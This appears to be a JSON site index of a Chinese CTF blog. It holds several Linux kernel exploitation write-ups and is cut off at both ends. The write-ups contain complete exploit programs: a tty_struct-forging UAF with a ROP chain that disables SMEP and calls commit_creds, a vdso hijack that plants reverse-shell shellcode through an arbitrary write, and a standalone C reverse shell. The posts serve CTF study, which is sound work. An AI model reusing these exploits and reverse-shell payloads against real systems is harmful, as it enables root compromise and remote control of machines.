#include &lt;fcntl.h&gt;   #include &lt;unistd.h&gt;    char server_ip[]=&quot;127.0.0.1&quot;;  uint32_t server_port=7777;    int main()   &#123;      int sock = socket(AF_INET, SOCK_STREAM, 0);      struct sockaddr_in attacker_addr = &#123;0&#125;;      attacker_addr.sin_family = AF_INET;      attacker_addr.sin_port = htons(server_port);      attacker_addr.sin_addr.s_addr = inet_addr(server_ip);      while(connect(sock, (struct sockaddr *)&amp;attacker_addr,sizeof(attacker_addr))!=0);      dup2(sock, 0);      dup2(sock, 1);      dup2(sock, 2);      system(&quot;/bin/sh&quot;);  &#125;\n\n\n","categories":["CTF"],"tags":["堆溢出","Linux Kernel","Linux内核堆","hijack prctl","modprobe_path"]},{"title":"linux kernel pwn学习之伪造tty_struct执行任意函数","url":"/2020/02/29/linux_kernel_pwn_tty_struct/","content":"当用户打开ptmx驱动时，会分配一个tty_struct结构，它的结构如下\nstruct tty_struct &#123;      int magic;      struct kref kref;      struct device *dev;      struct tty_driver *driver;      const struct tty_operations *ops;      int index;      /* Protects ldisc changes: Lock tty not pty */      struct ld_semaphore ldisc_sem;      struct tty_ldisc *ldisc;      struct mutex atomic_write_lock;      struct mutex legacy_mutex;      struct mutex throttle_mutex;      struct rw_semaphore termios_rwsem;      struct mutex winsize_mutex;      spinlock_t ctrl_lock;      spinlock_t flow_lock;      /* Termios values are protected by the termios rwsem */      struct ktermios termios, termios_locked;      struct termiox *termiox;    /* May be NULL for unsupported */      char name[64];      struct pid *pgrp;       /* Protected by ctrl lock */      struct pid *session;      unsigned long flags;      int count;      struct winsize winsize;     /* winsize_mutex */      unsigned long stopped:1,    /* flow_lock */                flow_stopped:1,                unused:BITS_PER_LONG - 2;      int hw_stopped;      unsigned long ctrl_status:8,    /* ctrl_lock */                packet:1,                unused_ctrl:BITS_PER_LONG - 9;      unsigned int receive_room;  /* Bytes free for queue */      int flow_change;      struct tty_struct *link;      struct fasync_struct *fasync;      wait_queue_head_t write_wait;      wait_queue_head_t read_wait;      struct work_struct hangup_work;      void *disc_data;      void *driver_data;      spinlock_t files_lock;      /* protects tty_files list */      struct list_head tty_files;  #define N_TTY_BUF_SIZE 4096      int closing;      unsigned char *write_buf;      int write_cnt;      /* If the tty has a pending do_SAK, queue it here - akpm */      struct work_struct SAK_work;      struct tty_port *port;  &#125; __randomize_layout;  \n\n其中有一个**[const struct tty_operations *ops]{.mark}**指针，它是一个tty_operations指针，而tty_operations结构体里是一些列对驱动操作的函数指针。\nstruct tty_operations &#123;      struct tty_struct * (*lookup)(struct tty_driver *driver,              struct file *filp, int idx);      int  (*install)(struct tty_driver *driver, struct tty_struct *tty);      void (*remove)(struct tty_driver *driver, struct tty_struct *tty);      int  (*open)(struct tty_struct * tty, struct file * filp);      void (*close)(struct tty_struct * tty, struct file * filp);      void (*shutdown)(struct tty_struct *tty);      void (*cleanup)(struct tty_struct *tty);      int  (*write)(struct tty_struct * tty,                const unsigned char *buf, int count);      int  (*put_char)(struct tty_struct *tty, unsigned char ch);      void (*flush_chars)(struct tty_struct *tty);      int  (*write_room)(struct tty_struct *tty);      int  (*chars_in_buffer)(struct tty_struct *tty);      int  (*ioctl)(struct tty_struct *tty,              unsigned int cmd, unsigned long arg);      long (*compat_ioctl)(struct tty_struct *tty,                   unsigned int cmd, unsigned long arg);      void (*set_termios)(struct tty_struct *tty, struct ktermios * old);      void (*throttle)(struct tty_struct * tty);      void (*unthrottle)(struct tty_struct * tty);      void (*stop)(struct tty_struct *tty);      void (*start)(struct tty_struct *tty);      void (*hangup)(struct tty_struct *tty);      int (*break_ctl)(struct tty_struct *tty, int state);      void (*flush_buffer)(struct tty_struct *tty);      void (*set_ldisc)(struct tty_struct *tty);      void (*wait_until_sent)(struct tty_struct *tty, int timeout);      void (*send_xchar)(struct tty_struct *tty, char ch);      int (*tiocmget)(struct tty_struct *tty);      int (*tiocmset)(struct tty_struct *tty,              unsigned int set, unsigned int clear);      int (*resize)(struct tty_struct *tty, struct winsize *ws);      int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);      int (*get_icount)(struct tty_struct *tty,                  struct serial_icounter_struct *icount);      void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);  #ifdef CONFIG_CONSOLE_POLL      int (*poll_init)(struct tty_driver *driver, int line, char *options);      int (*poll_get_char)(struct tty_driver *driver, int line);      void (*poll_put_char)(struct tty_driver *driver, int line, char ch);  #endif      int (*proc_show)(struct seq_file *, void *);  &#125; __randomize_layout;  \n\n比如，我们对ptmx驱动进行write操作时，就会调用这个里面的write指针指向的函数。也就是，我们如果能**[伪造tty_operations结构体，将里面的指针指向我们需要执行的函数]{.mark}。然后将tty_struct结构体里的[const struct tty_operations *ops]{.mark}指针指向我们伪造的tty_operations结构体，然后对驱动执行对应的操作，比如write，就能触发函数的执行。[而tty_struct结构体，我们可以通过漏洞来控制]{.mark}，然后修改指针。[这种思想，就如同是glibc下的house of orange]{.mark}**，house of orange是伪造vtable表，而我们这里，同样是伪造函数表。为了加深理解，我们以ciscn2017_babydriver为例，之前，我们利用UAF修改了cred结构，这次，我们用同样的方法，修改tty_struct结构。\nciscn2017_babydriver阅读对应版本的linux内核源码，我们发现,tty_struct结构体的大小为0x2E0。[为了实现执行的目的，我们可以利用ROP]{.mark},但是本题没有栈溢出，我们可以**[伪造tty_operations里面对应的函数的来将栈转移到我们可以控制的地方]{.mark}**。为了清楚对应的函数被调用前的各个寄存器的值，以方便我们后续的分析，我们先将tty_operations[7]伪造为babydriver里的babyread函数的地址。查看结构体，tty_operations[7]也就是对驱动进行write操作时的处理函数的指针。我们现在把它伪造指向了babyread，然后利用gdb调试，对ptmx驱动执行write操作，在babyread函数前断点。\nfor (int i=0;i&lt;35;i++) &#123;     fake_tty_operations[i] = 0xffffffffc0000000 + i;  &#125;  fake_tty_operations[7] = 0xffffffffc0000130;  //babyread的函数地址\n\n\n\n然后，执行exp，在babyread下断了下来，我们查看各个寄存器的值，发现rax正好指向我们的fake_tty_operations，\n\n\n因此，我们只需要把fake_tty_operations[7]伪造成gadgets\nmov rsp,rax;  ...........  ret  \n\n这样，我们对驱动执行write操作时，就能够将栈转移到我们用户的fake_tty_operations空间里，我们在这里面再布置一个栈转移的gadgets，将栈最终转移到我们的rop数组里，执行rop。\n完成这些以后，就是常规ROP操作了。我们最终的exploit.c程序\n#include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt;  #include &lt;unistd.h&gt;  #include &lt;fcntl.h&gt;  #include &lt;sys/ioctl.h&gt;    //tty_struct结构体的大小  #define TTY_STRUCT_SIZE 0x2E0  //mov cr4, rdi ; pop rbp ; ret  #define MOV_CR4_RDI 0xffffffff81004d80  //pop rdi ; ret  #define POP_RDI 0xffffffff810d238d  //swapgs ; pop rbp ; ret  #define SWAPGS 0xffffffff81063694  //iretq  #define IRETQ 0xFFFFFFFF8181A797  //commit_creds函数  #define COMMIT_CREDS 0xffffffff810a1420  // prepare_kernel_cred  #define PREPARE_KERNEL_CRED 0xffffffff810a1810  //mov rsp, rax;dec ebx;ret，做栈迁移用  #define MOV_RSP_RAX 0xFFFFFFFF8181BFC5  #define POP_RAX 0xffffffff8100ce6e    void getRoot() &#123;     //函数指针     void *(*pkc)(int) = (void *(*)(int))PREPARE_KERNEL_CRED;     void (*cc)(void *) = (void (*)(void *))COMMIT_CREDS;     //commit_creds(prepare_kernel_cred(0))     (*cc)((*pkc)(0));  &#125;    void getShell() &#123;     if (getuid() == 0) &#123;        printf(&quot;[+]Rooted!!\\n&quot;);        system(&quot;/bin/sh&quot;);     &#125; else &#123;        printf(&quot;[+]Root Fail!!\\n&quot;);     &#125;  &#125;    size_t user_cs,user_ss,user_flags,user_sp;    /*保存用户态的寄存器到变量里*/  void saveUserState() &#123;     __asm__(&quot;mov %cs,user_cs;&quot;             &quot;mov %ss,user_ss;&quot;             &quot;mov %rsp,user_sp;&quot;             &quot;pushf;&quot;             &quot;pop user_flags;&quot;             );    puts(&quot;user states have been saved!!&quot;);  &#125;    int main() &#123;     //保存用户态寄存器     saveUserState();     int fd1 = open(&quot;/dev/babydev&quot;,O_RDWR);     int fd2 = open(&quot;/dev/babydev&quot;,O_RDWR);     if (fd1 &lt; 0 || fd2 &lt; 0) &#123;        printf(&quot;open file error!!\\n&quot;);        exit(-1);     &#125;     //申请一个tty_struct大小的堆     ioctl(fd1,0x10001,TTY_STRUCT_SIZE);     //释放这个堆     close(fd1);     size_t rop[0x100];     int i = 0;     rop[i++] = POP_RDI;     rop[i++] = 0x6f0;     rop[i++] = MOV_CR4_RDI;     rop[i++] = 0;     rop[i++] = (size_t)getRoot;     rop[i++] = SWAPGS;     rop[i++] = 0;     rop[i++] = IRETQ;     rop[i++] = (size_t)getShell;     rop[i++] = user_cs;     rop[i++] = user_flags;     rop[i++] = user_sp;     rop[i++] = user_ss;       size_t fake_tty_operations[35];     /*for (int i=0;i&lt;35;i++) &#123;       fake_tty_operations[i] = 0xffffffffc0000000 + i;    &#125;*/     //这个位置是write函数的指针，经过调试，我们发现当调用这个函数时，rax正好是fake_tty_operation的地址，于是，我们把栈转移到     //fake_tty_operations里     fake_tty_operations[7] = MOV_RSP_RAX;     //栈转移到fake_tty_operations里后，我们继续做一次转移，把转转移到我们的rop数组里，执行ROP     fake_tty_operations[0] = POP_RAX;     fake_tty_operations[1] = (size_t)rop;     fake_tty_operations[2] = MOV_RSP_RAX;       size_t fake_tty_struct[4];     //这个操作会申请tty_struct的空间，也就是会申请到我们之前释放的那个堆里，我们可以用fd2来对它操作     int fd_tty = open(&quot;/dev/ptmx&quot;, O_RDWR);     //我们先把原始的tty_struct前面的数据读出来，存储     read(fd2,fake_tty_struct,4*8);     //修改const struct tty_operations *ops;指针，指向我们伪造的tty_operations     fake_tty_struct[3] = (size_t)fake_tty_operations;     //把篡改过的tty_struct写回去     write(fd2,fake_tty_struct,4*8);     char buf[0x10];     write(fd_tty,buf,0x10);     return 0;  &#125;  \n\n\n","categories":["CTF"],"tags":["ROP","UAF","Linux Kernel","tty_struct"]},{"title":"linux kernel pwn学习之劫持vdso","url":"/2020/03/06/linux_kernel_pwn_vdso/","content":"VDSO就是Virtual Dynamic Shared Object，是内核提供的虚拟的.so,这个.so文件不在磁盘上，而是在内核里头。内核把包含某.so的内存页在程序启动的时候映射入其内存空间，对应的程序就可以当普通的.so来使用里面的函数。Vdso里面封装了这几个函数，其作用主要是加快对于某些对速度要求很高的系统调用，更多详细信息可以查看https://blog.csdn.net/juana1/article/details/6904932\n\n\n由于vdso是在内核里，每个程序使用的时候，从内核里映射给程序，如果我们事先在内核里把vdso给劫持了，并把相应的函数覆盖成我们的shellcode，然后，当其他程序要用的时候，从内核把我们篡改过的vdso映射过去，如果它正好调用了对应的函数，就会执行我们对应位置布下的shellcode。当然普通权限的程序，调用我们的shellcode，也只是普通权限；如果有root权限的程序，调用我们的shellcode，那么我们的shellcode也是以root权限执行。在linux中，crontab是带有root权限的，并且它会不断的调用vdso里的gettimeofday函数，因此，我们如果把gettimeofday函数劫持为shellcode，等待被调用即可。至于为什么可以劫持vdso，因为vdso对于用户程序，只读、执行，而对于内核，它是RWX的，可以修改。因此只要利用漏洞，将对于函数修改为shellcode，布置在vdso的shellcode可以为反弹shell的shellcode，也可以是再运行一个其他程序，其他程序将继承权限。以CSAW-2015-StringIPC为例。\nCSAW-2015-StringIPC为了劫持vdso，首先需要知道vdso在内核里的地址，查看内核映射图，vdso在内核附近，因此我们确定范围0xffffffff80000000——0xffffffffffffefff\n0xffffffffffffffff  ---+-----------+-----------------------------------------------+-------------+                         |           |                                               |+++++++++++++|      8M                 |           | unused hole                                   |+++++++++++++|                         |           |                                               |+++++++++++++|  0xffffffffff7ff000  ---|-----------+------------| FIXADDR_TOP |--------------------|+++++++++++++|      1M                 |           |                                               |+++++++++++++|  0xffffffffff600000  ---+-----------+------------| VSYSCALL_ADDR |------------------|+++++++++++++|      548K               |           | vsyscalls                                     |+++++++++++++|  0xffffffffff577000  ---+-----------+------------| FIXADDR_START |------------------|+++++++++++++|      5M                 |           | hole                                          |+++++++++++++|  0xffffffffff000000  ---+-----------+------------| MODULES_END |--------------------|+++++++++++++|                         |           |                                               |+++++++++++++|      1520M              |           | module mapping space (MODULES_LEN)            |+++++++++++++|                         |           |                                               |+++++++++++++|  0xffffffffa0000000  ---+-----------+------------| MODULES_VADDR |------------------|+++++++++++++|                         |           |                                               |+++++++++++++|      512M               |           | kernel text mapping, from phys 0              |+++++++++++++|                         |           |                                               |+++++++++++++|  0xffffffff80000000  ---+-----------+------------| __START_KERNEL_map |-------------|+++++++++++++|      2G                 |           | hole                                          |+++++++++++++|  0xffffffff00000000  ---+-----------+-----------------------------------------------|+++++++++++++|      64G                |           | EFI region mapping space                      |+++++++++++++|  0xffffffef00000000  ---+-----------+-----------------------------------------------|+++++++++++++|      444G               |           | hole                                          |+++++++++++++|  0xffffff8000000000  ---+-----------+-----------------------------------------------|+++++++++++++|      16T                |           | %esp fixup stacks                             |+++++++++++++|  0xffffff0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|      3T                 |           | hole                                          |+++++++++++++|  0xfffffc0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|      16T                |           | kasan shadow memory (16TB)                    |+++++++++++++|  0xffffec0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|      1T                 |           | hole                                          |+++++++++++++|  0xffffeb0000000000  ---+-----------+-----------------------------------------------| kernel space|      1T                 |           | virtual memory map for all of struct pages    |+++++++++++++|  0xffffea0000000000  ---+-----------+------------| VMEMMAP_START |------------------|+++++++++++++|      1T                 |           | hole                                          |+++++++++++++|  0xffffe90000000000  ---+-----------+------------| VMALLOC_END   |------------------|+++++++++++++|      32T                |           | vmalloc/ioremap (1 &lt;&lt; VMALLOC_SIZE_TB)        |+++++++++++++|  0xffffc90000000000  ---+-----------+------------| VMALLOC_START |------------------|+++++++++++++|      1T                 |           | hole                                          |+++++++++++++|  0xffffc80000000000  ---+-----------+-----------------------------------------------|+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|      64T                |           | direct mapping of all phys. memory            |+++++++++++++|                         |           | (1 &lt;&lt; MAX_PHYSMEM_BITS)                       |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|  0xffff880000000000 ----+-----------+-----------| __PAGE_OFFSET_BASE | -------------|+++++++++++++|                         |           |                                               |+++++++++++++|      8T                 |           | guard hole, reserved for hypervisor           |+++++++++++++|                         |           |                                               |+++++++++++++|  0xffff800000000000 ----+-----------+-----------------------------------------------+-------------+                         |-----------|                                               |-------------|                         |-----------| hole caused by [48:63] sign extension         |-------------|                         |-----------|                                               |-------------|  0x0000800000000000 ----+-----------+-----------------------------------------------+-------------+      PAGE_SIZE          |           | guard page                                    |xxxxxxxxxxxxx|  0x00007ffffffff000 ----+-----------+--------------| TASK_SIZE_MAX | ---------------|xxxxxxxxxxxxx|                         |           |                                               |  user space |                         |           |                                               |xxxxxxxxxxxxx|                         |           |                                               |xxxxxxxxxxxxx|                         |           |                                               |xxxxxxxxxxxxx|      128T               |           | different per mm                              |xxxxxxxxxxxxx|                         |           |                                               |xxxxxxxxxxxxx|                         |           |                                               |xxxxxxxxxxxxx|                         |           |                                               |xxxxxxxxxxxxx|  0x0000000000000000 ----+-----------+-----------------------------------------------+-------------+  \n\n我们该以什么为依据来搜索vdso呢？\n我们可以以当前程序的vdso里字符串的偏移为依据，在程序中，获取当前的vdso地址的代码如下\n//获取vdso里的字符串&quot;gettimeofday&quot;相对vdso.so的偏移  int get_gettimeofday_str_offset() &#123;     //获取当前程序的vdso.so加载地址0x7ffxxxxxxxx     size_t vdso_addr = getauxval(AT_SYSINFO_EHDR);     char* name = &quot;gettimeofday&quot;;     if (!vdso_addr) &#123;        errExit(&quot;[-]error get name&#x27;s offset&quot;);     &#125;     //仅需要搜索1页大小即可，因为vdso映射就一页0x1000     size_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));     if (name_addr &lt; 0) &#123;        errExit(&quot;[-]error get name&#x27;s offset&quot;);     &#125;     return name_addr - vdso_addr;  &#125;  \n\n我们先确定字符串，比如gettimeofday在vdso.so里的偏移，通过这段代码，即可确定，然后我们在指定的范围内，一页一页(0x1000字节)的搜索，如果在当前一页数据处偏移offset后是gettimeofday字符串，那么，我们就能确定当前页起始地址就是vdso在内核里的地址。我们必须一页一页的搜索，这样成功率高，因为vdso的映射就一页。\n当我们搜索到vdso在内核的地址后，接下来，准备劫持gettimeofday函数，那么，我们需要先确定gettimeofday在vdso内的偏移。我们可以用gdb把vdso给dump出来，再来分析。\n首先，运行我们未写完的exploit，得到vdso在内核中的地址\n\n\n然后，我们用gdb target到虚拟机\n\n\n接着dump出vdso.so,dump一页大小即可\n\n\n这样，我们得到vdso.so，拖到IDA中，**查看gettimeofday函数的偏移为0xCB0,**由此，我们计算出gettimeofday函数在内核中的地址，利用任意读写漏洞，覆盖这里为我们shellcode即可。我们的shellcode是一个反弹shell的shellcode，它将shell反弹到本地端口3333。我们只需nc 本地端口3333即可。Shellcode可以自己编写，也可以用现成的https://gist.github.com/itsZN/1ab36391d1849f15b785\n综上，我们exploit.c程序\n#include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt;  #include &lt;string.h&gt;  #include &lt;unistd.h&gt;  #include &lt;fcntl.h&gt;  #include &lt;sys/ioctl.h&gt;  #include &lt;sys/prctl.h&gt;  #include &lt;sys/time.h&gt;  #include &lt;sys/auxv.h&gt;    #define CSAW_IOCTL_BASE     0x77617363  #define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1  #define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2  #define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3  #define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4  #define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5  #define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6  #define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7  #define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8  //gettimeofday函数在vdso.so里的偏移  //运行程序，得到vdso.so的地址  //用gdb dump出vdso.so文件，拿到IDA里分析函数的地址  #define GETTIMEOFDAY_FUN 0xCB0    struct alloc_channel_args &#123;      size_t buf_size;      int id;  &#125;;    struct shrink_channel_args &#123;      int id;      size_t size;  &#125;;    struct read_channel_args &#123;      int id;      char *buf;      size_t count;  &#125;;    struct write_channel_args &#123;      int id;      char *buf;      size_t count;  &#125;;    struct seek_channel_args &#123;      int id;      loff_t index;      int whence;  &#125;;    void errExit(char *msg) &#123;     puts(msg);     exit(-1);  &#125;  //驱动的文件描述符  int fd;  //初始化驱动  void initFD() &#123;     fd = open(&quot;/dev/csaw&quot;,O_RDWR);     if (fd &lt; 0) &#123;        errExit(&quot;[-] open file error!!&quot;);     &#125;  &#125;    //申请一个channel,返回id  int alloc_channel(size_t size) &#123;     struct alloc_channel_args args;     args.buf_size = size;     args.id = -1;     ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;args);     if (args.id == -1) &#123;        errExit(&quot;[-]alloc_channel error!!&quot;);     &#125;     return args.id;  &#125;    //改变channel的大小  void shrink_channel(int id,size_t size) &#123;     struct shrink_channel_args args;     args.id = id;     args.size = size;     ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;args);  &#125;  //seek  void seek_channel(int id,loff_t offset,int whence) &#123;     struct seek_channel_args args;     args.id = id;     args.index = offset;     args.whence = whence;     ioctl(fd,CSAW_SEEK_CHANNEL,&amp;args);  &#125;  //读取数据  void read_channel(int id,char *buf,size_t count) &#123;     struct read_channel_args args;     args.id = id;     args.buf = buf;     args.count = count;     ioctl(fd,CSAW_READ_CHANNEL,&amp;args);  &#125;  //写数据  void write_channel(int id,char *buf,size_t count) &#123;     struct write_channel_args args;     args.id = id;     args.buf = buf;     args.count = count;     ioctl(fd,CSAW_WRITE_CHANNEL,&amp;args);  &#125;  //任意地址读  void arbitrary_read(int id,char *buf,size_t addr,size_t count) &#123;     seek_channel(id,addr-0x10,SEEK_SET);     read_channel(id,buf,count);  &#125;  //任意地址写  //由于题目中使用了strncpy_from_user,遇到0就会截断，因此，我们逐字节写入  void arbitrary_write(int id,char *buf,size_t addr,size_t count) &#123;     for (int i=0;i&lt;count;i++) &#123;        seek_channel(id,addr+i-0x10,SEEK_SET);        write_channel(id,buf+i,1);     &#125;  &#125;  //获取vdso里的字符串&quot;gettimeofday&quot;相对vdso.so的偏移  int get_gettimeofday_str_offset() &#123;     //获取当前程序的vdso.so加载地址0x7ffxxxxxxxx     size_t vdso_addr = getauxval(AT_SYSINFO_EHDR);     char* name = &quot;gettimeofday&quot;;     if (!vdso_addr) &#123;        errExit(&quot;[-]error get name&#x27;s offset&quot;);     &#125;     //仅需要搜索1页大小即可，因为vdso映射就一页0x1000     size_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));     if (name_addr &lt; 0) &#123;        errExit(&quot;[-]error get name&#x27;s offset&quot;);     &#125;     return name_addr - vdso_addr;  &#125;    //用于反弹shell的shellcode，127.0.0.1:3333  char shellcode[]=&quot;\\x90\\x53\\x48\\x31\\xc0\\xb0\\x66\\x0f\\x05\\x48\\x31\\xdb\\x48\\x39\\xc3\\x75\\x0f\\x48\\x31\\xc0\\xb0\\x39\\x0f\\x05\\x48\\x31\\xdb\\x48\\x39\\xd8\\x74\\x09\\x5b\\x48\\x31\\xc0\\xb0\\x60\\x0f\\x05\\xc3\\x48\\x31\\xd2\\x6a\\x01\\x5e\\x6a\\x02\\x5f\\x6a\\x29\\x58\\x0f\\x05\\x48\\x97\\x50\\x48\\xb9\\xfd\\xff\\xf2\\xfa\\x80\\xff\\xff\\xfe\\x48\\xf7\\xd1\\x51\\x48\\x89\\xe6\\x6a\\x10\\x5a\\x6a\\x2a\\x58\\x0f\\x05\\x48\\x31\\xdb\\x48\\x39\\xd8\\x74\\x07\\x48\\x31\\xc0\\xb0\\xe7\\x0f\\x05\\x90\\x6a\\x03\\x5e\\x6a\\x21\\x58\\x48\\xff\\xce\\x0f\\x05\\x75\\xf6\\x48\\xbb\\xd0\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xd3\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\x48\\x31\\xd2\\xb0\\x3b\\x0f\\x05\\x48\\x31\\xc0\\xb0\\xe7\\x0f\\x05&quot;;    int main() &#123;     char *buf = (char *)calloc(1,0x1000);     initFD();     //申请一个channel，大小0x100     int id = alloc_channel(0x100);     //改变channel大小，形成漏洞,实现任意地址读写     shrink_channel(id,0x101);     //获取gettimeofday字符串在vdso.so里的偏移     int gettimeofday_str_offset = get_gettimeofday_str_offset();     printf(&quot;gettimeofday str in vdso.so offset=0x%x\\n&quot;,gettimeofday_str_offset);     size_t vdso_addr = -1;     for (size_t addr=0xffffffff80000000;addr &lt; 0xffffffffffffefff;addr += 0x1000) &#123;        //读取一页数据        arbitrary_read(id,buf,addr,0x1000);        //如果在对应的偏移处，正好是这个字符串，那么我们就能确定当前就是vdso的地址        //之所以能确定，是因为我们每次读取了0x1000字节数据，也就是1页，而vdso的映射也只是1页        if (!strcmp(buf+gettimeofday_str_offset,&quot;gettimeofday&quot;)) &#123;           printf(&quot;[+]find vdso.so!!\\n&quot;);           vdso_addr = addr;           printf(&quot;[+]vdso in kernel addr=0x%lx\\n&quot;,vdso_addr);           break;        &#125;     &#125;     if (vdso_addr == -1) &#123;        errExit(&quot;[-]can&#x27;t find vdso.so!!&quot;);     &#125;     size_t gettimeofday_addr = vdso_addr + GETTIMEOFDAY_FUN;     printf(&quot;[+]gettimeofday function in kernel addr=0x%lx\\n&quot;,gettimeofday_addr);     //将gettimeofday处写入我们的shellcode，因为写操作在内核驱动里完成，内核可以读写执行vdso     //用户只能读和执行vdso     arbitrary_write(id,shellcode,gettimeofday_addr,strlen(shellcode));     sleep(1);     printf(&quot;[+]open a shell\\n&quot;);     system(&quot;nc -lvnp 3333&quot;);     return 0;  &#125;  \n\n**劫持vdso能够成功提权的条件是有root权限的程序调用vdso。**在真实环境下，crontab会调用，而在模拟的qemu里，使用了一个程序来模拟\n#include &lt;stdio.h&gt;  int main()&#123;      while(1)&#123;          sleep(1);          gettimeofday();      &#125;  &#125;\n\n将它编译后，在init启动脚本里加入它。本题，自带了这个程序来模拟。\n","categories":["CTF"],"tags":["堆溢出","Linux Kernel","Linux内核堆","VDSO"]},{"title":"linux kernel pwn学习之条件竞争(一)","url":"/2020/03/04/linux_kernel_pwn_%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E4%B8%80/","content":"条件竞争发生在多线程多进程中，往往是因为没有对全局数据、函数进行加锁，导致多进程同时访问修改，使得数据与理想的不一致而引发漏洞。本节，我们从wctf2018-klist这题来分析一下条件竞争制造UAF的利用。\nwctf2018-klist首先，查看一下启动脚本，发现开启了smep机制，说明内核不能直接执行用户空间的代码\nqemu-system-x86_64 \\  -enable-kvm -cpu kvm64,+smep   -kernel ./bzImage \\  -append &quot;console=ttyS0 root=/dev/ram rw oops=panic panic=1 quiet kaslr&quot; \\  -initrd ./rootfs.cpio -nographic -m 2G \\  -smp cores=2,threads=2,sockets=1 -monitor /dev/null \\  -nographic  \n\n然后，我们用IDA分析一下list.ko文件，open的时候，初始化了一个缓冲区，然后初始化了一个互斥锁\n\n\nRead的时候，是从缓冲区里记录的节点里读取数据，每一步操作，都在互斥锁内部，说明这里执行时，其他线程会被排斥到外，直到当前线程执行完解锁。\n\n\nWrite的时候，同理，向缓冲区记录的节点里写数据\n\n\nioctl定义了增删改查的操作\n\n\nSelect_item函数的作用就是选择指定位置的节点记录到缓冲区里，这样才能对其进行read&#x2F;write操作。全程都有互斥锁的保护。\n\n\n创建节点，会把节点的used字段设置为1\n\n\nRemove节点，全程没有显式的调用kfree函数，我们注意到put函数\n\n\nPut函数里，对节点的used域做了原子减法减去1，如果结果为0，就会释放这个节点\n\n\n配套的get函数，对节点的used域做了原子加法加1\n\n\n所以，我们发现，remove_item里，都是用的put来释放节点，因为节点创建时,used&#x3D;1，减去1就是0，就被释放了。我们发现，除了remove_item函数里，是put单独使用，其他函数里都是get和put配套使用。\n\n\n比如这个select_item函数里，就是配套使用，由于都在互斥锁里，所以最后执行完毕,used的值不会变。照着这个思想，我们来看一下list_head函数，漏洞就在这里，put操作没有在锁内，并且是put(g_list),g_list就是整个链表的头节点\n\n\n我们再回过头来看看创建节点时，采用的是头插法\n\n\n并且，新节点的used域为1，假如，在list_head函数的get操作之后，put操作之前，另一个线程正好创建了一个新节点，把g_list赋值为了这个新节点，接下来put操作，将g_list的used减去1后发现为0，就会释放这个节点，然后却没有把g_list指向下一个节点，这就造成了堆的UAF。\n内核堆的UAF很容易利用，一种方法是将tty_struct申请到这里，伪造ops指针，然后本题我们不能使用tty_struct，因为，我们没有权限打开&#x2F;dev&#x2F;ptmx设备，看看init脚本里设置了啥\n...  chown root:tty /dev/console  chown root:tty /dev/ptmx  chown root:tty /dev/tty  ...  \n\n那么，我们在用第二种方法，之前，我们分析到，这个链表节点的结构是这样的\nstruct list_node &#123;     int64_t used;     size_t size;     list_node *next;     char buf[XX];  &#125;  \n\n我们如果能控制size域，将它赋值很大，那么，我们就能溢出堆，搜索内存里的cred结构，然后改写它，进而提权。然而，我们UAF只能控制buf数据区。有一个**巧妙的方法就是利用pipe管道。**在pipe创建管道的时候，会申请这样一个结构\nstruct pipe_buffer &#123;      struct page *page;      unsigned int offset, len;      const struct pipe_buf_operations *ops;      unsigned int flags;      unsigned long private;  &#125;;  \n\n其中，page是pipe存放数据的缓冲区，offset和len是数据的偏移和长度。比如，一开始,offset和len都是0，当我们write(pfd[1],buf,0x100);的时候,offset &#x3D; 0，len &#x3D; 0x100。然而，我们注意到,offset和len都是4字节数据，如果把它们拼在一起，凑成8字节，就是\n0x10000000000，如果能够与list_node的size域对应起来，我们就能溢出堆了。\n因此，我们一开始申请一个与pipe_buffer大小一样的堆，然后利用竞争释放后，创建一个管道，pipe_buffer就会申请到这里，接下来再write(pfd[1],buf,0x100)，就能使得size域变得很大，那么我们就能溢出堆，进行内存搜索了。\n我们的exploit.c程序\n#include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt;  #include &lt;stdint.h&gt;  #include &lt;string.h&gt;  #include &lt;unistd.h&gt;  #include &lt;fcntl.h&gt;  #include &lt;sys/ioctl.h&gt;    //pipe_buffer的大小，阅读源码可知  #define PIPE_BUFFER_SIZE 0x280    //驱动的fd  int fd;  //打开驱动  void initFD() &#123;     fd = open(&quot;/dev/klist&quot;,O_RDWR);     if (fd &lt; 0) &#123;        printf(&quot;[-]open file error!!\\n&quot;);        exit(-1);     &#125;  &#125;    //创建节点时，需要发送的数据  struct Data &#123;     size_t size;     char *buf;  &#125;;    void addItem(char *buf,size_t size) &#123;     struct Data data;     data.size = size;     data.buf = buf;     ioctl(fd,0x1337,&amp;data);  &#125;    void removeItem(int64_t index) &#123;     ioctl(fd,0x1339,index);  &#125;    void selectItem(int64_t index) &#123;     ioctl(fd,0x1338,index);  &#125;    void listHead(char *buf) &#123;     